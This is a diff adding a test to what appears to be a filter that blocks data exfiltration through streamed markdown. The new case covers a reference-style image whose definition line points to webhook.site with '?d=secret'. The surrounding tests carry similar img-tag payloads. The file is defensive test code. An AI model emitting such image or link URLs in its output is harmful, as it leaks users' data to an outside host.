@@ -66,6 +66,14 @@ describe('ExfilStreamHold', () => {
     expect(run(['text ', '](https://webhook.site/?d=1) more'])).toBeNull()
   })
 
+  // A reference-style image fetches the URL of its definition line. The
+  // buffered scanner does not read definitions yet (#574); the hold does.
+  it('cuts the URL of a link reference definition', () => {
+    expect(run(['![chart][r]\n\n[r]: https://webhook.site/', '?d=secret\n'])).toBeNull()
+    expect(run(['[r]: <https://webhook.site/?d=1>'])).toBeNull()
+    expect(run(['[r]: https://example.com/docs\n'])).not.toBeNull()
+  })
+
   it('does not close an <img at a > inside a quoted attribute', () => {
     expect(run(['<img alt=">" src="https://webhook.site/?d=1">'])).toBeNull()
     expect(run(["<img alt='>' ", "src='https://webhook.site/?d=1'>"])).toBeNull()
